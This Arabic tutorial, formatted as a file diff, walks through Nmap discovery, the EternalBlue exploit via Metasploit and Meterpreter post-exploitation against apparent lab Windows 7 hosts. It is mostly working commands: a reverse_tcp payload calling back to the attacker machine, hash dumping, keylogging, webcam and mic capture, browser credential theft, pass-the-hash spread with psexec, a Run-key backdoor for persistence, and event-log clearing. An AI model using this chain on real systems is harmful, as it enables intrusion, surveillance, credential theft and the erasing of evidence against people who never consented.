@@ -1,0 +1,612 @@
+🎯 شرح شامل: Nmap + msfconsole + جميع الأوامر
+
+🔍 الجزء 1: nmap فحص الشبكة الكامل
+
+الخطوة 1: اكتشاف الأجهزة النشطة
+
+```bash
+# 1. مسح سريع للشبكة
+nmap -sn 192.168.146.0/24
+# أو
+nmap -sn 192.168.146.1-254
+```
+
+النتيجة:
+
+```
+Nmap scan report for 192.168.146.128  # كالي
+Host is up (0.00020s latency)
+
+Nmap scan report for 192.168.146.133  # Windows 7-1
+Host is up (0.0015s latency)
+
+Nmap scan report for 192.168.146.134  # Windows 7-2  
+Host is up (0.0012s latency)
+```
+
+الخطوة 2: فحص المنافذ المفتوحة
+
+```bash
+# فحص جميع المنافذ (يأخذ وقت)
+nmap -sS -sV -O -p- 192.168.146.133
+
+# فحص سريع للمنافذ المهمة فقط
+nmap -sS -sV -p21,22,23,25,80,135,139,445,3389 192.168.146.133
+```
+
+شرح الخيارات:
+
+· -sS: SYN Scan (أخف وأسرع)
+· -sV: اكتشاف نسخة الخدمة
+· -O: اكتشاف نظام التشغيل
+· -p-: كل المنافذ (1-65535)
+· -p21,445,...: منافذ محددة فقط
+
+الخطوة 3: فحص ثغرة MS17-010
+
+```bash
+# فحص مباشر للثغرة
+nmap --script smb-vuln-ms17-010 -p445 192.168.146.133
+```
+
+النتيجة المتوقعة:
+
+```
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+```
+
+الخطوة 4: جمع معلومات SMB
+
+```bash
+# جميع سكربتات SMB
+nmap --script smb-* -p445 192.168.146.133
+
+# معلومات النظام
+nmap --script smb-os-discovery -p445 192.168.146.133
+
+# المستخدمون
+nmap --script smb-enum-users -p445 192.168.146.133
+
+# المشاركات
+nmap --script smb-enum-shares -p445 192.168.146.133
+```
+
+---
+
+⚡ الجزء 2: msfconsole مفصل + أوامر جديدة
+
+2.1 هيكل msfconsole:
+
+```bash
+msfconsole
+```
+
+```
+┌─────────────────────────────────┐
+│        Metasploit Console       │
+├─────────────────────────────────┤
+│  msf6 >                         │  # الواجهة الرئيسية
+│  msf6 exploit(exploit_name) >   │  # داخل exploit
+│  meterpreter >                  │  # داخل session
+└─────────────────────────────────┘
+```
+
+2.2 أوامر msfconsole الجديدة:
+
+أ. إدارة Workspace:
+
+```bash
+# إنشاء workspace جديد
+workspace -a Windows7_Lab
+
+# عرض جميع workspaces
+workspace
+
+# الانتقال لـ workspace
+workspace Windows7_Lab
+
+# حذف workspace
+workspace -d Old_Lab
+```
+
+ب. إدارة Database:
+
+```bash
+# حالة الـ database
+db_status
+
+# استيراد نتائج nmap
+db_import /tmp/nmap_scan.xml
+
+# عرض الـ hosts
+hosts
+
+# عرض الـ services
+services
+
+# عرض الـ vulns
+vulns
+```
+
+ج. البحث المتقدم:
+
+```bash
+# بحث بفلاتر
+search name:eternalblue type:exploit platform:windows
+
+# بحث حسب CVE
+search cve:2017-0144
+
+# بحث حسب الـ rank
+search rank:excellent
+```
+
+د. إدارة الجلسات:
+
+```bash
+# عرض جميع الجلسات
+sessions
+
+# عرض بالتفصيل
+sessions -l
+
+# الدخول لجلسة
+sessions -i 1
+
+# قتل جلسة
+sessions -k 1
+
+# قتل جميع الجلسات
+sessions -K
+
+# ترقية جلسة shell إلى meterpreter
+sessions -u 1
+```
+
+هـ. الـ Jobs:
+
+```bash
+# عرض الـ jobs النشطة
+jobs
+
+# قتل job
+jobs -k 1
+
+# قتل جميع jobs
+jobs -K
+```
+
+---
+
+🛠️ الجزء 3: جميع أوامر Meterpreter (محدث)
+
+3.1 System Commands:
+
+```bash
+sysinfo          # معلومات النظام
+getuid           # المستخدم الحالي
+getpid           # PID الحالي
+localtime        # وقت النظام
+idletime         # وقت الخمول
+reboot           # إعادة تشغيل
+shutdown         # إيقاف التشغيل
+```
+
+3.2 Process Commands (تفصيل):
+
+```bash
+# عرض جميع العمليات
+ps
+ps -S            # بترتيب حسب الذاكرة
+ps -A            # عرض كل شيء
+
+# قتل عملية
+kill 1234        # بـ PID
+kill -f explorer.exe  # بالاسم
+
+# بحث عن عمليات
+ps | grep -i chrome  # بحث عن كروم
+
+# تفاصيل عملية
+getprivs          # صلاحيات العملية
+steal_token       # سرقة token من عملية
+
+# الانتقال (مهم جداً)
+migrate 580       # الانتقال لـ services.exe
+migrate -N explorer.exe  # الانتقال لـ explorer.exe
+migrate -f        # الانتقال تلقائي لأول عملية مناسبة
+```
+
+3.3 File System Commands:
+
+```bash
+# التنقل
+pwd               # المسار الحالي
+cd C:\\Users      # تغيير المجلد
+lpwd              # المسار المحلي (في كالي)
+lcd /home/kali    # تغيير المسار المحلي
+
+# عرض الملفات
+ls                # قائمة الملفات
+ls -la            # بتفاصيل أكثر
+lls               # ls للمسار المحلي
+
+# الملفات
+cat file.txt      # عرض محتوى ملف
+edit file.txt     # تعديل ملف (بـ vi)
+rm file.txt       # حذف ملف
+rm -rf folder     # حذف مجلد
+mv old new        # نقل/تسمية
+cp src dst        # نسخ
+
+# البحث
+search -f *.txt                     # بحث عن txt
+search -f *pass* -d C:\\Users       # بحث عن pass في Users
+search -f *.pdf -s 10000000         # ملفات pdf أكبر من 10MB
+
+# التنزيل/الرفع
+download "C:\\file.txt" .           # تنزيل
+download -r "C:\\Documents" ./docs  # تنزيل مجلد
+upload /home/kali/backdoor.exe "C:\\Temp\\"  # رفع
+```
+
+3.4 Network Commands:
+
+```bash
+# معلومات الشبكة
+ipconfig          # عناوين IP
+netstat           # اتصالات الشبكة
+getproxy          # إعدادات الـ Proxy
+portfwd           # توجيه المنافذ
+
+# مثال: توجيه منفذ
+portfwd add -l 3389 -p 3389 -r 192.168.146.133
+# الآن يمكنك الاتصال بـ localhost:3389 للوصول لـ RDP الهدف
+
+# الـ routing
+route             # عرض routes
+run autoroute -s 192.168.146.0/24  # إضافة route
+```
+
+3.5 Desktop Commands:
+
+```bash
+# الشاشة
+screenshot        # لقطة شاشة
+screengrab        # نفس screenshot
+screenshare       # مشاركة الشاشة حية
+
+# الماوس
+mouse_move x y    # تحريك الماوس
+mouse_click left  # ضغط زر
+mouse_doubleclick # ضغط مزدوج
+
+# الكيبورد
+keyevent          # إرسال حدث زر
+keyscan_start     # بدء تسجيل الضغطات
+keyscan_dump      # عرض المسجل
+keyscan_stop      # إيقاف التسجيل
+```
+
+3.6 Webcam/Mic Commands:
+
+```bash
+# الكاميرا
+webcam_list       # عرض الكاميرات
+webcam_snap       # صورة
+webcam_stream     # بث مباشر
+
+# الميكروفون
+record_mic        # تسجيل صوت
+```
+
+3.7 Privilege Escalation:
+
+```bash
+# التصعيد
+getsystem         # تصعيد لـ SYSTEM (المهم)
+getsystem -t 1    # بتقنية محددة (1-5)
+
+# إذا فشل getsystem
+bypassuac         # تجاوز UAC
+run post/windows/escalate/getsystem  # module للتصعيد
+
+# سرقة الـ tokens
+steal_token       # من عملية أخرى
+incognito         # إدارة الـ tokens
+```
+
+3.8 Credential Commands:
+
+```bash
+# الـ hashes
+hashdump          # سرقة hashes
+run post/windows/gather/hashdump  # module متقدم
+
+# الـ passwords
+run post/windows/gather/credentials/windows_autologin  # كلمات تسجيل الدخول
+run post/windows/gather/enum_chrome                    # كلمات كروم
+run post/windows/gather/enum_firefox                   # فايرفوكس
+```
+
+3.9 الوصول للـ Shell:
+
+```bash
+# طرق فتح shell
+shell             # shell بسيط (قد يعلق)
+execute -f cmd.exe -i  # أفضل (يفتح cmd)
+execute -H -f cmd.exe -c  # مخفي
+
+# إذا علق shell، اضغط:
+Ctrl+Z            # للخروج
+# أو من meterpreter:
+Ctrl+C            # يقتل shell ويعود لـ meterpreter
+```
+
+3.10 Registry Commands:
+
+```bash
+# التحكم في الريجستري
+reg enumkey -k HKLM\\Software  # عرض مفاتيح
+reg queryval -k HKLM\\... -v ValueName  # قراءة قيمة
+reg setval -k HKLM\\... -v Name -d Data  # كتابة قيمة
+reg deleteval -k HKLM\\... -v Name      # حذف قيمة
+```
+
+3.11 Miscellaneous:
+
+```bash
+# معلومات إضافية
+checkvm           # تحقق إذا كان VM
+getenv            # عرض environment variables
+getprivs          # صلاحيات العملية
+
+# الـ timestomp
+timestomp file.txt -v                # عرض وقت الملف
+timestomp file.txt -z "01/01/2020"   # تغيير الوقت
+
+# إخفاء
+clearev           # مسح Event Logs
+```
+
+---
+
+🎯 الجزء 4: سيناريو كامل مع جميع الأوامر
+
+اليوم 1: الاكتشاف والاختراق
+
+```bash
+# 1. nmap scan
+nmap -sn 192.168.146.0/24
+nmap -sS -sV -p445 192.168.146.133
+nmap --script smb-vuln-ms17-010 -p445 192.168.146.133
+
+# 2. msfconsole
+msfconsole
+workspace -a Windows7_Test
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.146.133
+set LHOST 192.168.146.128
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+```
+
+اليوم 2: الاستكشاف والتحكم
+
+```bash
+# داخل meterpreter
+sysinfo
+getuid
+getsystem
+hashdump
+
+# العمليات
+ps
+migrate 580  # لـ services.exe
+
+# الملفات
+cd C:\\Users
+ls
+download "Desktop\\secrets.txt" .
+
+# الـ shell
+execute -f cmd.exe -i
+whoami
+ipconfig
+exit
+
+# التجسس
+screenshot
+keyscan_start
+# انتظر 5 دقائق
+keyscan_dump
+keyscan_stop
+```
+
+اليوم 3: الانتشار
+
+```bash
+# 1. سرقة hashes من الجهاز الأول
+background
+
+# 2. استخدام الـ hash للجهاز الثاني
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.146.134
+set SMBUser Administrator
+set SMBPass [HASH_FROM_WIN7_1]
+exploit
+
+# 3. الثباتية على الجهازين
+meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.146.128
+meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Update -d "C:\\Windows\\Temp\\backdoor.exe"
+```
+
+---
+
+⚠️ الجزء 5: حلول المشاكل الشائعة
+
+مشكلة: kill PID لا يعمل
+
+```bash
+# اتبع هذه الخطوات:
+ps                    # 1. تأكد من PID
+getprivs              # 2. تأكد من الصلاحيات
+getsystem             # 3. اصعد الصلاحيات أولاً
+kill 1234             # 4. جرب مرة أخرى
+
+# إذا ما زال لا يعمل:
+shell                 # 5. افتح cmd
+taskkill /f /pid 1234 # 6. قتل من cmd
+```
+
+مشكلة: ls يظهر خطأ
+
+```bash
+# الأسباب والحلول:
+# 1. المسار غير موجود → pwd ثم cd لمسار صحيح
+# 2. صلاحيات غير كافية → getsystem
+# 3. المجلد فارغ → طبيعي
+```
+
+مشكلة: upload فشل
+
+```bash
+# جرب كل هذه:
+getsystem  # 1. صلاحيات
+# 2. استخدم المسار الصحيح
+upload /home/kali/file.exe C:\\Windows\\Temp\\file.exe
+# 3. جرب كـ exe
+# 4. حجم الملف كبير؟ قسمه
+```
+
+مشكلة: الجلسة تنقطع
+
+```bash
+# الحلول:
+# 1. استخدم migrate فور الدخول
+migrate -f
+# 2. استخدم AutoRunScript
+set AutoRunScript migrate -f
+# 3. جرب payload مختلف
+set PAYLOAD windows/shell/reverse_tcp
+```
+
+---
+
+📊 الجزء 6: جدول مرجعي سريع
+
+أهم أوامر nmap:
+
+```bash
+nmap -sn [NETWORK]        # اكتشاف أجهزة
+nmap -sS -sV [TARGET]     # مسح المنافذ
+nmap --script smb-vuln*   # فحص ثغرات SMB
+nmap -O [TARGET]          # اكتشاف نظام التشغيل
+```
+
+أهم أوامر msfconsole:
+
+```bash
+search [TERM]             # بحث
+use [EXPLOIT]             # استخدام
+show options              # عرض الإعدادات
+set [OPTION] [VALUE]      # تعيين قيمة
+exploit                   # تنفيذ
+sessions                  # عرض الجلسات
+back                      # الرجوع
+```
+
+أهم أوامر meterpreter:
+
+```bash
+# النظام
+sysinfo, getuid, getsystem
+# العمليات
+ps, kill, migrate
+# الملفات
+ls, cd, download, upload
+# الشبكة
+ipconfig, portfwd
+# التجسس
+screenshot, keyscan_start
+# الوصول
+shell, execute
+# التصعيد
+getsystem, hashdump
+```
+
+---
+
+🎓 الجزء 7: نصائح لفهم سريع
+
+1. ثلاثية الاختراق:
+
+```
+نقطة الدخول → تصعيد الصلاحيات → الانتشار
+   (exploit)      (getsystem)    (hashdump → psexec)
+```
+
+2. إذا نسيـت أمراً:
+
+```bash
+# في meterpreter
+help           # كل الأوامر
+help [COMMAND] # شرح أمر محدد
+
+# في msfconsole
+help
+show -h
+```
+
+3. تسجيل كل شيء:
+
+```bash
+# في meterpreter
+get_session_log    # يحفظ كل ما كتبته
+spool /tmp/log.txt # يبدأ التسجيل
+spool off          # يوقف التسجيل
+```
+
+---
+
+🚀 الخلاصة النهائية:
+
+للبدء الآن:
+
+```bash
+# 1. اكتشف
+nmap -sn 192.168.146.0/24
+
+# 2. افحص
+nmap --script smb-vuln-ms17-010 -p445 [TARGET]
+
+# 3. اخترق
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS [TARGET]
+set LHOST 192.168.146.128
+exploit
+
+# 4. تحكم
+getsystem
+hashdump
+ps
+migrate [PID]
+download/upload
+```
+
+التسلسل المنطقي:
+
+```
+nmap → اكتشاف → msfconsole → exploit → meterpreter → 
+getsystem → hashdump → ps → migrate → download → 
+background → psexec → الانتشار
+```
+
+الآن جرب كل أمر بنفسك. إذا واجهت خطأ، قل لي: 1) أي أمر كتبته 2) أي خطأ ظهر 3) في أي مرحلة كنت.
